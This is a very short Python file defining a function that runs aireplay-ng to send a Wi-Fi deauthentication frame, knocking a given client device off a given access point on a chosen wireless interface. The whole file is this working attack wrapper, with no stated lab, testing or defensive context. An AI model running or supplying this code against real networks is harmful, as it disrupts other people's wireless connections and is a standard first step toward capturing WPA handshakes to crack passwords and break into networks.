import subprocess


def deauth(mac, station_bssid, iface):
    subprocess.run(["aireplay-ng", "-0", "1", "-a", station_bssid, "-c", mac, iface])
